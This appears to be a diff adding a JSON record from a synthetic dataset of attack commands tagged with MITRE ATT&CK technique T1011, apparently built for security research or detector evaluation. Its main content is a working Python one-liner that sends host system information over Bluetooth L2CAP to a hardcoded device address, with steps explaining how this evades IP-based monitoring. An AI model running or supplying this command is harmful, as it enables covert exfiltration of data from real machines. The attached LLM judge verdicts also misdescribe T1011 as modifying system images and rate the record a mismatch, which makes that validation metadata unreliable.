@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Linux",
+  "shell": "Python",
+  "command": "python3 -c \"import socket,platform; s=socket.socket(socket.AF_BLUETOOTH, socket.SOCK_SEQPACKET, socket.BTPROTO_L2CAP); s.settimeout(6); s.connect(('5C:F3:70:12:34:56', 0x1003)); s.sendall(('sys='+str(platform.uname())+'\\n').encode()); s.close()\"",
+  "explanation": "Sends host identification over Bluetooth L2CAP PSM 0x1003, bypassing IP-centric monitoring systems per T1011.",
+  "rationale_steps": [
+    "Pick L2CAP to avoid the main IP-based monitoring plane.",
+    "Use a less-common PSM (0x1003) to reduce service collisions.",
+    "Serialize minimal system info and send over L2CAP.",
+    "Close cleanly to prevent lingering connections."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-PYTHON-T1011-2e02ce6e-d365518a",
+  "source_prompt_hash": "2e02ce6e",
+  "timestamp_utc": "2025-09-30T08:40:28.862749Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python command is perfectly well-formed with balanced parentheses, proper string formatting, correct socket parameter usage, and valid Python syntax throughout.",
+        "semantic_score": 3,
+        "semantic_justification": "While the command does establish a Bluetooth connection and send system information, it doesn't align with T1011 (Exfiltration Over Other Network Medium) rather than the described technique of modifying system images/firmware.",
+        "combined_score": 4.0,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T18:33:10.913376Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The Python code is perfectly well-formed, using valid syntax, balanced delimiters, and proper function calls within the 'python3 -c' execution context.",
+        "semantic_score": 1,
+        "semantic_justification": "While the command successfully attempts to send system information via Bluetooth and bypass IP monitoring, it has no semantic relation to MITRE ATT&CK T1011 'Modify System Image' as it performs data exfiltration, not image modification.",
+        "combined_score": 3.0,
+        "confidence": 1.0,
+        "timestamp": "2025-10-02T18:33:21.490123Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Python one-liner with balanced quotes/parentheses and valid socket calls and separators.",
+        "semantic_score": 0,
+        "semantic_justification": "The command exfiltrates host info over Bluetooth L2CAP and does not modify firmware, bootloaders, or system images as described by the technique.",
+        "combined_score": 2.5,
+        "confidence": 1,
+        "timestamp": "2025-10-02T18:33:29.960192Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 1.333,
+    "llm_average_score": 3.167,
+    "llm_verdict": "likely_mismatch",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
